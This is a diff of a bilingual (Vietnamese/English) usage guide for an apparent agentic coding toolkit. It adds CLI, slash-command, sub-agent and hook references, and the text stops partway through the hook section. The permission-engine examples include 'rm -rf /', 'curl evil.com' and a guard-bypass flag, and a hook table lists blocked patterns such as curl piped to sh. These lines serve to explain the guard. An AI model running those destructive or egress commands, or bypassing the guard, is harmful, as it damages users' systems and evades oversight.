@@ -1,16 +1,21 @@
-# VibecodeKit Hybrid Ultra — Hướng dẫn sử dụng chi tiết
+# VibecodeKit Hybrid Ultra — Hướng dẫn sử dụng chi tiết (v0.16.1)
 
 Bộ kit đầy đủ để build dự án theo phương pháp **VIBECODE-MASTER** với **Full
-Agentic OS** runtime (87 conformance probes @ 100 % parity at v0.16.0, all actionable tests pass
-từ repo root; bundled `tests/` trong skill zip chứa một subset đại diện để
-user smoke-test sau khi extract — xem §15.10).  Bản này ứng với
-**v0.15.4** — doc-sync hotfix.  v0.11.4.1 was the original full
-big-update that shipped all 6 taw-kit features
-integration: F1 scaffold engine (10 preset × 3 stacks), F2 deploy
-orchestrator (7 target), F3 auto-commit + sensitive-file guard, F4
-single-prompt `/vibe` router, F5 VN error translator + faker, F6
-CLAUDE.md auto-maintain.  **Xem §16 để biết cách dùng nhanh các tính
-năng mới**.
+Agentic OS** runtime (87 conformance probes @ 100 % parity at v0.16.1, all
+actionable tests pass từ repo root; bundled `tests/` trong skill zip chứa
+một subset đại diện để user smoke-test sau khi extract — xem §15.10).
+Bản này ứng với **v0.16.1** — doc-coherence + recheck cleanup release
+(closing 5 P3 findings từ v0.16.0 auto-recheck).  Lịch sử các bản trước:
+
+- **v0.16.1** — doc coherence + recheck cleanup (PR #16, this release)
+- **v0.16.0** — final cleanup of v0.15.4 audit P3 findings (PR #15)
+- **v0.16.0a0** — α: wire `auto_commit_hook` + multi-token routers (PR #14)
+- **v0.15.5** — green hotfix: stale runtime version constants (PR #13)
+- **v0.15.4** — doc-sync hotfix
+- **v0.11.4.1** — original full big-update với 6 taw-kit feature
+  (F1 scaffold engine, F2 deploy orchestrator, F3 auto-commit guard,
+  F4 single-prompt `/vibe` router, F5 VN error translator + faker,
+  F6 CLAUDE.md auto-maintain — xem §16).
 
 Tài liệu hướng dẫn cách sử dụng kit trong **ChatGPT**, **OpenAI Codex CLI**, và
 **Claude Code / Claw Code CLI** để build project end-to-end.
@@ -19,9 +24,18 @@ Tài liệu hướng dẫn cách sử dụng kit trong **ChatGPT**, **OpenAI Cod
 > để unzip, chạy lệnh đầu tiên và xem decision tree "bạn là ai → đi con đường
 > nào".  Quay lại file này khi cần tham khảo sâu từng phần.
 
+> 📦 **Cần tham khảo nhanh inventory đầy đủ?**  Nhảy thẳng tới
+> [§19 CLI reference (31 subcommand)](#19-cli-reference--31-subcommand),
+> [§20 Slash command reference (42 lệnh)](#20-slash-command-reference--42-lệnh),
+> [§21 Sub-agent reference (7 vai)](#21-sub-agent-reference--7-vai),
+> [§22 Hook event reference (33 event + 4 script)](#22-hook-event-reference--33-event--4-script),
+> hoặc [§23 Conformance probe catalog (87 probe)](#23-conformance-probe-catalog--87-probe).
+
 ---
 
 ## Mục lục
+
+### Phần I — Hướng dẫn dùng (use-case driven)
 
 1. [Triết lý: 3 vai × 8 bước](#1-triết-lý-3-vai--8-bước)
 2. [Cài đặt](#2-cài-đặt)
@@ -36,17 +50,28 @@ Tài liệu hướng dẫn cách sử dụng kit trong **ChatGPT**, **OpenAI Cod
 11. [Vietnamese 12-point checklist](#11-vietnamese-12-point-checklist)
 12. [MCP server registration](#12-mcp-server-registration)
 13. [Memory hierarchy 3-tier](#13-memory-hierarchy-3-tier)
-14. [CLI cheatsheet](#14-cli-cheatsheet)
+14. [CLI cheatsheet (quick)](#14-cli-cheatsheet)
 15. [Troubleshooting](#15-troubleshooting)
-16. [v0.11.x BIG-UPDATE history — 6 tính năng mới](#16-v0110-big-update--6-tính-năng-mới)
+
+### Phần II — Reference catalog (lookup driven)
+
+19. [CLI reference — 31 subcommand](#19-cli-reference--31-subcommand)
+20. [Slash command reference — 42 lệnh](#20-slash-command-reference--42-lệnh)
+21. [Sub-agent reference — 7 vai](#21-sub-agent-reference--7-vai)
+22. [Hook event reference — 33 event + 4 script](#22-hook-event-reference--33-event--4-script)
+23. [Conformance probe catalog — 87 probe](#23-conformance-probe-catalog--87-probe)
+24. [Permission engine — 6 layer](#24-permission-engine--6-layer)
+25. [Release-gate strategy](#25-release-gate-strategy)
+
+### Phần III — Lịch sử & phụ lục
+
+16. [v0.11.x → v0.16.x release history](#16-release-history)
     1. [`/vibe` — single-prompt router (F4)](#161-vibe--single-prompt-router-f4)
     2. [`/vibe-scaffold` — 10 preset × 3 stacks (F1)](#162-vibe-scaffold--scaffold-engine-f1)
     3. [`/vibe-ship` — 7 deploy target (F2)](#163-vibe-ship--deploy-orchestrator-f2)
     4. [CLAUDE.md auto-maintain (F6)](#164-claudemd-auto-maintain-f6)
     5. [Auto-commit hook + sensitive-file guard (F3)](#165-auto-commit-hook--sensitive-file-guard-f3)
     6. [VN error translator + VN faker (F5)](#166-vn-error-translator--vn-faker-f5)
-17. [Browser daemon (`[browser]` extra) — v0.12.0+](#17-browser-daemon-browser-extra--v0120)
-18. [Activation Cheat Sheet — gstack-port modules (v0.12.0–v0.15.0)](#18-activation-cheat-sheet--gstack-port-modules-v0120v0150)
 
 ---
 
@@ -343,7 +368,7 @@ slash command trong `.claude/commands/` sẵn sàng.
 | `/vibe-rri-ui` | Bước 7 — pipeline 4-phase cho UI. |
 | `/vibe-verify` | Đóng báo cáo verify. |
 | `/vibe-complete` | Completion Report. |
-| `/vibe-audit` | Chạy 87 conformance probes (at v0.16.0). |
+| `/vibe-audit` | Chạy 87 conformance probes (at v0.16.1). |
 | `/vibe-doctor` | Chẩn đoán sức khỏe cài đặt. |
 | `/vibe-dashboard` | Dashboard runtime. |
 | `/vibe-permission <cmd>` | Hỏi permission engine có allow lệnh không. |
@@ -943,7 +968,7 @@ File HTML tự-chứa (không framework, không network), nhúng full JSON summa
 # Lifecycle
 vibe doctor                       # health check
 vibe dashboard                    # runtime dashboard
-vibe audit --threshold 0.85       # 87 probes at v0.16.0 (canonical count grows per release)
+vibe audit --threshold 0.85       # 87 probes at v0.16.1 (canonical count grows per release)
 vibe install <destination>        # cài overlay vào project
 vibe compact [--reactive]         # layer 4/5 compaction
 
@@ -1322,7 +1347,915 @@ cp <upstream>/tests/touchfiles.json tests/touchfiles.json   # rồi chỉnh
 
 ---
 
-## 16. v0.11.x BIG-UPDATE history — 6 tính năng mới
+---
+
+## 19. CLI reference — 31 subcommand
+
+> Pre-condition: `PYTHONPATH=$PWD/scripts` (hoặc đã cài runtime qua
+> `pip install -e .`). Tất cả subcommand chạy bằng:
+>
+> ```bash
+> python -m vibecodekit.cli <subcommand> [args...]
+> # alias: `vibe <subcommand>` nếu đã `pip install`
+> ```
+>
+> Mỗi subcommand đều trả về JSON envelope ổn định để dễ pipe vào `jq`
+> hoặc CI step.  Failure exit code = 1, success exit code = 0 trừ khi
+> nói rõ.
+
+### Lifecycle / health
+
+#### 19.1 `vibe doctor`
+
+Kiểm tra layout overlay đã wire đầy đủ chưa.  Phát hiện ngay 3 trường hợp:
+
+1. **Project bình thường** — overlay đã được install (`.claw.json`,
+   `CLAUDE.md`, `.claude/commands`, `ai-rules/vibecodekit/` đều ở repo
+   root).
+2. **Skill repo source tree** (mới ở v0.16.1) — overlay nằm dưới
+   `update-package/` và `scripts/vibecodekit/`; envelope sẽ có
+   `"skill_repo": true`.
+3. **Placeholder install** — `ai-rules/vibecodekit/` tồn tại nhưng
+   thiếu `scripts/`; doctor cảnh báo cần chạy `vibe install`.
+
+```bash
+vibe doctor                # JSON envelope, exit 0 nếu lành
+vibe doctor --installed-only   # exit 1 nếu placeholder/thiếu asset
+```
+
+Output (rút gọn):
+
+```json
+{
+  "skill_repo": true,
+  "advisory_present": [".claw.json", "CLAUDE.md", ".claude/commands",
+                       ".claude/agents", "ai-rules/vibecodekit",
+                       ".claw/hooks"],
+  "advisory_missing": [],
+  "package_importable": true,
+  "warnings": [],
+  "exit_code": 0
+}
+```
+
+#### 19.2 `vibe dashboard`
+
+Tóm tắt event runtime của session hôm nay (đọc từ event-bus
+`.vibecode/events/*.jsonl`).
+
+```bash
+vibe dashboard
+# → number of pre_tool_use, blocked patterns, approvals issued, ...
+```
+
+#### 19.3 `vibe audit`
+
+Chạy 87 conformance probe.  Default threshold = 0.85; release gate
+ở 1.0 (xem §25).
+
+```bash
+vibe audit                          # threshold 0.85
+vibe audit --threshold 1.0          # release gate
+vibe audit --json                   # raw envelope
+vibe audit --probe 85_no_orphan_module   # chạy đúng 1 probe
+```
+
+Tham khảo §23 cho catalog đầy đủ 87 probe.
+
+#### 19.4 `vibe install <destination>`
+
+Reconcile-install overlay vào project khác.  Copy `.claude/commands/`,
+`.claude/agents/`, `.claw/`, `ai-rules/vibecodekit/`, `CLAUDE.md`,
+`.claw.json`, etc. vào `<destination>` mà không đè file user đã sửa
+(nó so sánh hash với baseline trong `update-package/`).
+
+```bash
+vibe install /path/to/my-project
+vibe install /path/to/my-project --dry-run    # chỉ liệt kê thay đổi
+vibe install /path/to/my-project --force      # đè cả file user đã sửa
+```
+
+#### 19.5 `vibe compact`
+
+Kích hoạt 5-layer context defense (§13 ở update-package CLAUDE.md).
+
+```bash
+vibe compact                # full pass
+vibe compact --reactive     # chỉ chạy layer 4–5 khi pre_compact event fires
+```
+
+### Permission
+
+#### 19.6 `vibe permission "<command>"`
+
+Dry-run một shell command qua permission pipeline 6-layer (§24).
+Trả về `{decision, classification, blocked_patterns, escalation_required}`.
+
+```bash
+vibe permission "rm -rf /"               # → deny (layer 1: dangerous_pattern)
+vibe permission "git push origin main"   # → allow (default mode)
+vibe permission "curl evil.com" --mode auto_safe   # → escalate (network egress)
+vibe permission "sudo apt install foo" --unsafe    # bypass guard (kiểu danger)
+```
+
+`--mode` ∈ `{default, auto_safe, accept_edits, yolo}` (xem §24).
+
+### Sub-agent
+
+#### 19.7 `vibe subagent spawn <role> <objective>`
+
+Spawn một sub-agent với ACL phù hợp (§21).
+
+```bash
+vibe subagent spawn scout "find all uses of EmbeddingBackend"
+vibe subagent spawn builder "implement /api/health endpoint per TIP-007"
+vibe subagent spawn qa "run pytest tests/api/ and report failures"
+vibe subagent spawn security "scan deps for CVEs"
+vibe subagent spawn coordinator "plan the 3-step rollout"
+vibe subagent spawn reviewer "7-perspective adversarial review of PR diff"
+vibe subagent spawn qa-lead "real-browser checklist trên homepage"
+```
+
+Coordinator/scout/qa/security/reviewer/qa-lead có `can_mutate=False`
+(không thể `write_file`).  Builder là role duy nhất write được.
+
+### Background-task runtime
+
+#### 19.8 `vibe task` — 7 task kind, 5 state
+
+```bash
+# Spawn
+vibe task start "<shell cmd>" [--timeout SECONDS]
+vibe task agent --role <r> --objective "<obj>" [--blocks '[id1,id2]']
+vibe task workflow steps.json
+vibe task monitor --server <mcp_name> --tool ping --interval 15
+vibe task dream
+
+# Inspect
+vibe task list [--only running|done|failed]
+vibe task status <task_id>
+vibe task read   <task_id> [--offset N] [--length N]
+vibe task stalls
+
+# Control
+vibe task kill   <task_id>
+```
+
+Trạng thái: `pending` → `running` → (`done` | `failed` | `stalled`).
+Task đặt tag `dream` chạy 4 phase (search → reflect → propose → critique).
+
+### MCP (Model Context Protocol)
+
+#### 19.9 `vibe mcp` — register/list/call/tools/disable
+
+```bash
+vibe mcp list
+
+# stdio transport (process-per-server)
+vibe mcp register myserver --transport stdio \
+       --command python -m my.mcp.server --handshake
+
+# inproc transport (Python module trong process)
+vibe mcp register selfcheck --transport inproc \
+       --module vibecodekit.mcp_servers.selfcheck
+
+vibe mcp tools selfcheck                # list tools của server
+vibe mcp call  selfcheck ping           # gọi tool
+vibe mcp call  selfcheck echo --args-json '{"text":"hi"}'
+vibe mcp disable myserver
+```
+
+Bundled sample server (`vibecodekit.mcp_servers.selfcheck`) export 3
+tool: `ping`, `echo`, `now`.  Probe #20 verify MCP adapter; probe #29
+verify stdio handshake; probe #39 verify full handshake.
+
+### Cost / token ledger
+
+#### 19.10 `vibe ledger {summary, reset}`
+
+```bash
+vibe ledger summary           # tổng token + cost theo provider
+vibe ledger reset             # clear ledger (sau khi đã ship release)
+```
+
+Ledger được persist ở `.vibecode/ledger/`.
+
+### Memory (3-tier)
+
+#### 19.11 `vibe memory` — add / retrieve / stats / writeback
+
+```bash
+# Add
+vibe memory add user    "Prefer pnpm over npm for new projects"
+vibe memory add project "Test runner: pytest -p no:cacheprovider"
+vibe memory add team    "Release cadence: every 2 weeks"
+
+# Retrieve (hybrid lexical + embedding)
+vibe memory retrieve "test runner" --tiers project team --top-k 5
+vibe memory retrieve "deploy" --backend hash-256 --lexical-weight 0.7
+
+# Inspect
+vibe memory stats             # số entry per tier
+vibe memory writeback nest    # nest team memory vào CLAUDE.md
+vibe memory writeback auto    # auto-writeback bật theo policy
+```
+
+Tiers (§13):
+- `user`    — `~/.vibecode/memory/`           (cross-project)
+- `project` — `.vibecode/memory/`             (repo-local)
+- `team`    — `.vibecode/memory/team/`        (commit vào repo)
+
+### Approval contract
+
+#### 19.12 `vibe approval` — list / create / get / respond
+
+```bash
+vibe approval list
+
+vibe approval create --title "Deploy to prod" --kind permission \
+       --summary "rollout v1.2.3" --risk medium --reason "fix CVE-2024-X"
+
+vibe approval get appr-1a2b3c4d5e6f7890
+vibe approval respond appr-1a2b3c4d5e6f7890 allow --note "lgtm"
+vibe approval respond appr-1a2b3c4d5e6f7890 deny  --note "wait for QA"
+```
+
+Choices default = `{allow, deny}`; caller có thể override qua API
+`approval_contract.create(options=[...])`.  Probe #26 verify contract.
+
+### Methodology runners
+
+#### 19.13 `vibe rri-t <jsonl>`, `vibe rri-ux <jsonl>`, `vibe vn-check`
+
+```bash
+vibe rri-t  qa_results.jsonl       # 5 personas × 7 dims × 8 axes
+vibe rri-ux ux_results.jsonl       # Flow Physics 7 dims × 8 axes
+vibe vn-check --file flags.json    # 12-point Vietnamese checklist
+vibe vn-check --flags-json '{"vn_error_translator":true,"vn_faker":true,...}'
+```
+
+Gate FAIL nếu thiếu key bắt buộc hoặc dimension < 70 %.
+
+### Config
+
+#### 19.14 `vibe config` — show / set-backend / get
+
+Persistence: `~/.vibecode/config.json`.
+
+```bash
+vibe config show
+vibe config set-backend sentence-transformers   # dùng embedding model
+vibe config set-backend hash-256                # offline default
+vibe config get embedding.backend
+```
+
+### Intent + Pipeline router (mới ở v0.16.0a0+)
+
+#### 19.15 `vibe intent classify "<prose>"`
+
+Classify prose → một hoặc nhiều intent (BUILD, SCAN, RRI, VCK_REVIEW,
+VCK_CSO, VCK_PIPELINE, …).
+
+```bash
+vibe intent classify "review my code for security"
+# → intents=['VCK_REVIEW'], confidence=0.77
+
+vibe intent classify "build the whole thing"
+# → intents=['VCK_PIPELINE'], confidence=0.66   # (v0.16.1 adds this)
+```
+
+#### 19.16 `vibe pipeline route "<prose>"`, `vibe pipeline list`
+
+Master router gọi `/vck-pipeline` → 1 trong 3 pipeline (A=PROJECT
+CREATION, B=FEATURE DEV, C=CODE & SECURITY).
+
+```bash
+vibe pipeline list
+vibe pipeline route "scan my codebase for security issues"
+# → pipeline=C, confidence=0.91
+```
+
+### Scaffold + Ship
+
+#### 19.17 `vibe scaffold {list, preview, apply, history, rollback}`
+
+10 preset × 3 stack = 30 starter project (probe #43, #45).
+
+```bash
+vibe scaffold list
+vibe scaffold preview --preset saas --stack nextjs
+vibe scaffold apply   --preset saas --stack nextjs --target ./my-app
+vibe scaffold history
+vibe scaffold rollback <history_id>
+```
+
+Preset: `saas`, `portfolio`, `docs`, `dashboard`, `landing`, `blog`,
+`ecommerce`, `internal-tools`, `auth-only`.  Stack: `nextjs`,
+`fastapi`, `astro`.  Seed `.vibecode/` directory (probe #83).
+
+#### 19.18 `vibe ship`
+
+Deploy tới 1 trong 7 target: Vercel, Docker, VPS, Cloudflare Pages,
+Railway, Fly.io, Render (xem §16.3).
+
+```bash
+vibe ship --target vercel
+vibe ship --target docker --image-tag myapp:0.1.0
+vibe ship --target fly    --app-name my-app --region sin
+```
+
+### Manifest + Refine + Verify + Anti-patterns + Module + Context
+
+#### 19.19 `vibe manifest {emit, show}`
+
+```bash
+vibe manifest show                     # in JSON manifest
+vibe manifest emit > manifest.json     # ghi file
+```
+
+Manifest gồm metadata: 42 slash commands, 7 agents, 33 hook events,
+87 probes, version, build hash.
+
+#### 19.20 `vibe refine`
+
+Refine ticket (BƯỚC 8/8 của VIBECODE-MASTER) — open template + classify
+diff theo v5 refine envelope.  Probe #40 verify boundary classifier.
+
+```bash
+vibe refine --diff-json diff.json
+vibe refine --diff-from HEAD~1
+```
+
+Output: `{tier, requires_vision, reasons, signals}`.
+
+#### 19.21 `vibe verify`
+
+Adversarial QA gate cho TIP đã build xong.  Tự gọi RRI-T (testing) +
+RRI-UX (nếu có UI) + VN-check (nếu VN scope).
+
+```bash
+vibe verify --tip TIP-007.json
+```
+
+Probe #41 verify req coverage.
+
+#### 19.22 `vibe anti-patterns`
+
+Liệt kê 12 SaaS anti-pattern (probe #42) — dùng làm checklist trong
+review.
+
+```bash
+vibe anti-patterns
+vibe anti-patterns --json
+```
+
+#### 19.23 `vibe module {plan, run}` — Pattern F
+
+Add 1 module mới vào codebase đã tồn tại theo nguyên tắc reuse-max /
+build-min (probe #44).
+
+```bash
+vibe module --name billing --spec "Stripe checkout + webhook"
+```
+
+Output: kế hoạch + reuse inventory + acceptance criteria.
+
+#### 19.24 `vibe context {show, switch}`
+
+Quản lý layout context (cwd, active branch, active TIP).
+
+#### 19.25 `vibe activate`
+
+Activate gstack-port modules theo cheat-sheet §18.  Đặt feature flag
+trong `.claw.json`.
+
+```bash
+vibe activate browser              # bật browser daemon
+vibe activate session-ledger       # bật cost ledger
+vibe activate team-mode            # bật team mode (probe #75/#78)
+```
+
+### Team / Learn
+
+#### 19.26 `vibe team {init, status}`
+
+Team mode bootstrap (`.vibecode/team.json`) — probe #75 + #78.
+
+```bash
+vibe team init    # tạo .vibecode/team.json
+vibe team status  # ai đang on-call, learnings count
+```
+
+#### 19.27 `vibe learn`
+
+Capture 1 learning vào `.vibecode/learnings.jsonl` (probe #74, #82).
+
+```bash
+vibe learn --scope team "pnpm faster than npm trong CI"
+vibe learn --scope project "test runner = pytest -p no:cacheprovider"
+```
+
+`session_start` hook auto-inject learnings 7 ngày gần nhất (probe #82).
+
+### Discover + Run
+
+#### 19.28 `vibe discover`
+
+Dynamic skill discovery — quét `.claude/commands/` ở project hiện tại
++ skill bundle để build manifest cho IDE hỗ trợ tab-completion.
+
+```bash
+vibe discover
+vibe discover --json
+```
+
+Probe #13.
+
+#### 19.29 `vibe run <plan.json>`
+
+Execute plan qua query-loop runtime (DAG of TIPs với dependency
+resolution + retry).
+
+```bash
+vibe run my-plan.json
+vibe run my-plan.json --mode default      # permission mode
+vibe run my-plan.json --mode accept_edits # auto-accept file edits
+```
+
+Probe #1 (async generator loop).
+
+### Pipeline (master)
+
+#### 19.30 `vibe pipeline route "<prose>"` (đã list ở §19.16)
+
+#### 19.31 Hidden subcommand: `vibe-doctor` (legacy alias)
+
+Một số shell wrapper script trong update-package vẫn gọi `vibe-doctor`
+như legacy alias. Trong v0.16.1 cả hai dạng đều hoạt động.
+
+---
+
+## 20. Slash command reference — 42 lệnh
+
+> Tất cả slash command nằm dưới `.claude/commands/`.  Mỗi `.md` file
+> có frontmatter `name`, `description`, `version`, `agent`,
+> `allowed-tools`, đôi khi có `triggers` (cho master router
+> `/vck-pipeline`).
+
+### 20.1 Mặt cắt thống kê
+
+| Loại | Count | Notes |
+|---|---|---|
+| `/vibe-*` lifecycle | 25 | core methodology + runtime |
+| `/vibe` master | 1 | single-prompt router (F4) |
+| `/vck-*` extension | 16 | code review / QA / pipeline ops |
+| **Tổng** | **42** | xác định bởi probe `63_vck_commands_present` + count `update-package/.claude/commands/` |
+
+### 20.2 Lifecycle (`/vibe-*` core 25 + master 1)
+
+| Slash | Agent | Mô tả |
+|---|---|---|
+| `/vibe` | (router) | master single-prompt router (F4) — phân loại prose vào 1 trong 25 `/vibe-*` |
+| `/vibe-scan` | scout | scan repo + docs (BƯỚC 1) |
+| `/vibe-rri` | — | Reverse Requirements Interview, 5 personas (BƯỚC 2) |
+| `/vibe-vision` | — | define goals/KPI/non-goals (BƯỚC 3) |
+| `/vibe-blueprint` | coordinator | architecture + data + interfaces (BƯỚC 4) |
+| `/vibe-tip` | — | mở Task Instruction Pack template |
+| `/vibe-task` | — | DAG + agent/workflow/monitor/dream tasks (BƯỚC 5) |
+| `/vibe-subagent` | — | spawn agent (xem §21) (BƯỚC 6) |
+| `/vibe-run` | — | execute query-loop plan |
+| `/vibe-verify` | — | adversarial QA gate (BƯỚC 7) |
+| `/vibe-complete` | — | completion report + quality gate |
+| `/vibe-refine` | — | refine ticket (BƯỚC 8/8) + boundary classifier |
+| `/vibe-module` | builder | Pattern F: add module reuse-max/build-min |
+| `/vibe-rri-t` | — | testing release gate (5×7×8) |
+| `/vibe-rri-ux` | — | UX release gate (Flow Physics 7×8) |
+| `/vibe-rri-ui` | — | UI design pipeline (4-phase) |
+| `/vibe-memory` | — | 3-tier memory + auto-maintain CLAUDE.md |
+| `/vibe-approval` | — | structured approval / elicitation |
+| `/vibe-permission` | — | dry-run command qua permission pipeline |
+| `/vibe-compact` | — | 5-layer context defense |
+| `/vibe-doctor` | — | health check |
+| `/vibe-dashboard` | — | summarise today's events |
+| `/vibe-audit` | security | 87-probe conformance audit |
+| `/vibe-install` | — | reconcile-install overlay vào project mới |
+| `/vibe-scaffold` | builder | scaffold preset (10 × 3 = 30) |
+| `/vibe-ship` | — | deploy 7 target |
+
+### 20.3 Extension (`/vck-*` × 16)
+
+VCK-HU thêm các command focus vào code review / QA / ops, agnostic của
+methodology core.
+
+| Slash | Agent | Mô tả |
+|---|---|---|
+| `/vck-pipeline` | coordinator | master router cho 3 pipeline (A=create, B=feature, C=code/security) |
+| `/vck-ship` | — | orchestrator: test → review → commit → push → PR |
+| `/vck-canary` | — | post-deploy canary 30 phút (health/error/latency) |
+| `/vck-cso` | — | Chief Security Officer audit (OWASP Top 10 + STRIDE + supply-chain, VN-first) |
+| `/vck-review` | — | adversarial 7-specialist code review (architect/security/perf/a11y/ux/dx/risk) |
+| `/vck-eng-review` | — | engineering-mode review (lock arch + ASCII diagram + state-machine) |
+| `/vck-ceo-review` | — | CEO-mode review (4 mode: SCOPE EXPANSION/SELECTIVE/HOLD/REDUCTION) |
+| `/vck-design-consultation` | — | build design system from scratch (tokens → components → patterns → flows) |
+| `/vck-design-review` | — | audit shipped UI vs design system + atomic fix loop |
+| `/vck-investigate` | — | root-cause debug (NO-FIX-WITHOUT-INVESTIGATION) |
+| `/vck-learn` | — | capture 1 learning vào `learnings.jsonl` |
+| `/vck-office-hours` | — | YC-style product interrogation (6 forcing Qs) |
+| `/vck-qa` | — | real-browser QA sub-second (Chromium daemon) |
+| `/vck-qa-only` | — | QA-only checklist (CI / pre-merge gate; no fix loop) |
+| `/vck-retro` | — | weekly retro (7 ngày learnings → keep/stop/try → 3 commit action) |
+| `/vck-second-opinion` | — | second-opinion review (gọi Codex / Gemini / Ollama) |
+
+### 20.4 Trigger phrases cho `/vck-pipeline`
+
+Master router `/vck-pipeline` có frontmatter `triggers:` để IDE/Claude
+Code biết khi prose tự nhiên nên dispatch.  Ở v0.16.1, danh sách
+trigger được pin ngược về `intent_router.VCK_PIPELINE` để 3 router
+(Claude Code dispatch, IntentRouter prose-mode, PipelineRouter EN/VN
+prose) đồng bộ:
+
+```
+pipeline · pipeline đầy đủ · pipeline day du · vck pipeline ·
+chọn pipeline · chon pipeline · master pipeline · pipeline router ·
+full check · go through pipeline · all gates · end to end · e2e check ·
+build the whole thing · set everything up
+```
+
+(2 phrase cuối là gap fix mới nhất ở v0.16.1 — xem CHANGELOG entry.)
+
+### 20.5 Agent binding (probe #52, #66)
+
+Slash command có `agent:` trong frontmatter sẽ tự động spawn đúng vai:
+
+```
+vibe-scan       → scout
+vibe-blueprint  → coordinator
+vibe-scaffold   → builder
+vibe-module     → builder
+vibe-audit      → security
+vck-pipeline    → coordinator
+```
+
+Các slash command còn lại không pin agent, dependency là context-free.
+
+### 20.6 Context wiring (probe #51, #36)
+
+Mỗi slash command file luôn import `.claude/contexts/`.md thư mục context
+share (e.g., `_v5-refine.md`, `_methodology-overview.md`).  Probe #51
+verify wiring; probe #53 verify skill paths.
+
+---
+
+## 21. Sub-agent reference — 7 vai
+
+> ACL được enforce ở `subagent_runtime.PROFILES`.  Coordinator,
+> scout, qa, security, reviewer, qa-lead đều có `can_mutate=False`
+> (không gọi được `write_file`/`append_file`).
+
+### 21.1 ACL table
+
+| Vai | `can_mutate` | `permission_mode` | Tool whitelist | Use case |
+|---|:---:|---|---|---|
+| **coordinator** | ✗ | `plan` | read-only + task-control + approvals | planning + orchestration; spawn builder/scout/qa khác |
+| **scout** | ✗ | `plan` | read-only + `run_command` (read-only verify) | grep/glob/read repo, find references |
+| **builder** | ✓ | `default` | full read + `run_command` + `write_file` + `append_file` + memory-write | implement TIP đã được approved; high-risk bubble-escalates |
+| **qa** | ✗ | `plan` | read-only + `run_command` | run tests, verify gate, đọc log |
+| **security** | ✗ | `plan` | read-only + `run_command` (read-only) | OWASP / STRIDE audit, redact log |
+| **reviewer** | ✗ | `plan` | read-only + `run_command` | adversarial 7-specialist review (architect/security/perf/a11y/ux/dx/risk) |
+| **qa-lead** | ✗ | `plan` | read-only + `run_command` | real-browser checklist, VN-12 gate, đề xuất fix loop |
+
+### 21.2 Tool ACL (chi tiết per role)
+
+```
+COMMON_READONLY = [
+  list_files, read_file, grep, glob,
+  task_status, task_read, task_notifications,
+  mcp_list, memory_retrieve, memory_stats, approval_list,
+]
+
+coordinator = COMMON_READONLY + [task_start, task_kill,
+                                 approval_create, approval_respond]
+scout       = COMMON_READONLY + [run_command]
+qa          = COMMON_READONLY + [run_command]
+security    = COMMON_READONLY + [run_command]
+reviewer    = COMMON_READONLY + [run_command]
+qa-lead     = COMMON_READONLY + [run_command]
+builder     = COMMON_READONLY + [task_start, task_kill, memory_add,
+                                 approval_create, approval_respond,
+                                 run_command, write_file, append_file]
+```
+
+### 21.3 Khi nào dùng vai nào
+
+| Tình huống | Vai phù hợp |
+|---|---|
+| "Hãy tìm tất cả nơi gọi function X" | **scout** |
+| "Hãy implement endpoint POST /api/v1/users theo TIP-007" | **builder** |
+| "Plan rollout 3 PR cho feature billing" | **coordinator** |
+| "Run pytest và báo failures" | **qa** |
+| "Audit deps cho CVE" | **security** |
+| "Adversarial review PR diff" | **reviewer** |
+| "Real-browser QA checklist trên homepage" | **qa-lead** |
+
+### 21.4 Probe binding
+
+- Probe `07_coordinator_restriction` — confirm coordinator **không**
+  có `write_file` trong tool whitelist.
+- Probe `52_command_agent_binding` — confirm slash command frontmatter
+  `agent:` tồn tại trong PROFILES.
+- Probe `66_vck_command_agent_binding` — confirm `/vck-*` cũng tuân
+  thủ binding.
+
+### 21.5 Spawn syntax
+
+CLI:
+```bash
+vibe subagent spawn <role> "<objective>"
+```
+
+Slash command (Claude Code / Claw Code):
+```
+/vibe-subagent <role> <objective>
+```
+
+Khi spawn, runtime tạo task ID `agent-<8hex>`, chuyển permission
+context, gọi sub-agent với tool whitelist tương ứng.  Sub-agent có
+quyền spawn task con (qua `task_start`) nếu role cho phép.
+
+---
+
+## 22. Hook event reference — 33 event + 4 script
+
+### 22.1 33 lifecycle event (`hook_interceptor.SUPPORTED_EVENTS`)
+
+Chia 9 nhóm:
+
+| Nhóm | Count | Events |
+|---|:---:|---|
+| Tool | 3 | `pre_tool_use`, `post_tool_use`, `post_tool_use_failure` |
+| Permission | 2 | `permission_request`, `permission_denied` |
+| Session | 3 | `session_start`, `session_end`, `setup` |
+| Agent | 3 | `subagent_start`, `subagent_stop`, `teammate_idle` |
+| Task | 4 | `task_created`, `task_completed`, `stop`, `stop_failure` |
+| Context | 3 | `pre_compact`, `post_compact`, `notification` |
+| Filesystem | 4 | `file_changed`, `cwd_changed`, `worktree_create`, `worktree_remove` |
+| UI / Config | 5 | `elicitation`, `elicitation_result`, `config_change`, `instructions_loaded`, `user_prompt_submit` |
+| Query legacy | 6 | `pre_query`, `post_query`, `pre_tip`, `post_completion`, `pre_release`, `pre_release_gate` |
+
+Probe `22_26_hook_events` pin 26 event canonical từ "Anatomy of an
+Agentic OS" Chapter 10.3; 7 event extra (post_tool_use_failure,
+stop_failure, post_compact, worktree_*, pre_release*) là forward-compat
+addition và không break probe.
+
+### 22.2 4 hook script (`update-package/.claw/hooks/`)
+
+| Script | Trigger event | Effect |
+|---|---|---|
+| `pre_tool_use.py` | `pre_tool_use` | block 40+ dangerous pattern (rm -rf, curl|sh, sudo apt remove, ...) |
+| `post_tool_use.py` | `post_tool_use` | log + redact secret; **drive `auto_commit_hook` khi `VIBECODE_AUTOCOMMIT=1`** (wired ở v0.16.0a0) |
+| `pre_compact.py` | `pre_compact` | run trước layer-4/5 compaction |
+| `session_start.py` | `session_start` | init runtime, banner, **inject 7-day learnings** (probe #82) |
+
+### 22.3 Auto-commit hook (opt-in, v0.16.0a0+)
+
+`post_tool_use.py` driven `auto_commit_hook` mỗi khi
+`VIBECODE_AUTOCOMMIT=1`.  Logic:
+
+```
+1. Bắt sự kiện post_tool_use → đọc payload
+2. Nếu payload có file diff:
+   a. Chạy sensitive-file guard (block .env, secrets, key, etc.)
+   b. Nếu OK → git add + git commit (atomic, 1 commit per tool call)
+3. Output JSON envelope { decision: allow, auto_commit: { ... } }
+```
+
+Disable mặc định.  Bật:
+```bash
+export VIBECODE_AUTOCOMMIT=1
+```
+
+Tắt khi đã bật:
+```bash
+unset VIBECODE_AUTOCOMMIT     # hoặc =0
+export VIBECODE_NO_AUTOCOMMIT=1
+```
+
+### 22.4 Custom hook
+
+Để thêm hook mới, tạo file `.py` trong `.claw/hooks/<event>.py`,
+expose function `def main(payload: dict) -> dict:`.  Runtime sẽ gọi
